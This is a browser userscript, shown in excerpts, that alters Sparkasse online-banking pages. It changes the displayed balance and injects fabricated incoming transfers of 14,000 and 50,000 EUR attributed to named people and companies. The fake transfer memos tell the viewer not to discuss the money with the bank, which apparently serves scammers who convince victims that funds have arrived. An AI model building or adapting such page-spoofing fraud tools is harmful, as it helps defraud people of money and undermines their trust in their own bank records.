...
// ==UserScript==
// @name         Ed Sp Combined Hans Friedrichs
...
// @downloadURL https://update.greasyfork.org/scripts/490290/Ed%20Sp%20Combined%20Hans%20Friedrichs.user.js
// @updateURL https://update.greasyfork.org/scripts/490290/Ed%20Sp%20Combined%20Hans%20Friedrichs.meta.js
// ==/UserScript==
...
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    ...
    var buchungTextsZahl = "327.680";
    var accountsecurity = "09 1575 20";
...
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    ...
    if (window.location.href.indexOf("finanzuebersicht.html") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf("10986501430") > 0) {
...
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
if (window.location.href.indexOf("umsaetze.html") > 0 || window.location.href.indexOf("11061847224") > 0 ) {
...
// Function to check if the element "umsatzanzahl mkp-layout-padding mkp-flex-1" is present
function checkUmsatzElement() {
    var umsatzElement = document.querySelector('.umsatzanzahl.mkp-layout-padding.mkp-flex-1');
    if (umsatzElement) {
        console.log("Element 'umsatzanzahl mkp-layout-padding mkp-flex-1' found. Modifying balance...");
        modifyMainBalance();
    } else {
        console.log("Element 'umsatzanzahl mkp-layout-padding mkp-flex-1' not found. Waiting for it to appear...");
        setTimeout(checkUmsatzElement, 50); // Check again after 1 second
    }
}
...
// Call the function to check if the element "umsatzanzahl mkp-layout-padding mkp-flex-1" is present
checkUmsatzElement();
...
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 ...
 var x3HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 14.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Alexander Faber">Alexander Faber</a></h3><p>Geld für alle Probleme.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">14.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">16.500,00 EUR</span></div></div></div></div></li>';
...
var x4HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 50.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="JP Morgan Chase">JP Morgan Chase</a></h3><p>Geld für Steuern. Bitte nur mit Andreas Graf besprechen.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">50.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">50.000,00 EUR</span></div></div></div></div></li>';
 ...
 var x5HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 14.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Steuern. Mit Sparkasse das Geld NICHT besprechen, damit nicht gesperrt wird.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">14.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">14.000,00 EUR</span></div></div></div></div></li>';
            ...
            document.getElementsByClassName("mkp-card-list")[0].innerHTML =  x3HTML + saveHTML;
        }
